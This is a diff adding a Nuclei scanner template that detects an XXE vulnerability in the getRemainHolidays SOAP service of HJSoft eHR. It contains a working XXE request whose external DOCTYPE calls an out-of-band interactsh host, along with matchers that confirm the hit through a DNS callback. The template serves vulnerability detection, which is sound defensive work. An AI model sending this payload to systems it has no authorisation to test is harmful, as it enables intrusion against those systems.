@@ -1,0 +1,43 @@
+id: hjsoft-ehr-getremainholidays-xxe
+info:
+  name: HJSoft eHR getRemainHolidays XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+http:
+  - raw:
+      - |
+        POST /services/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: ""
+        Content-Type: text/xml;charset=UTF-8
+
+        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}/getRemainHolidays">
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrp:getRemainHolidays>
+                 <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>
+                 <hrp:in1>cni23</hrp:in1>
+                 <hrp:in2><syscode>&send;</syscode></hrp:in2>
+              </hrp:getRemainHolidays>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "java.io.IOException"
+          - "getRemainHolidays"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
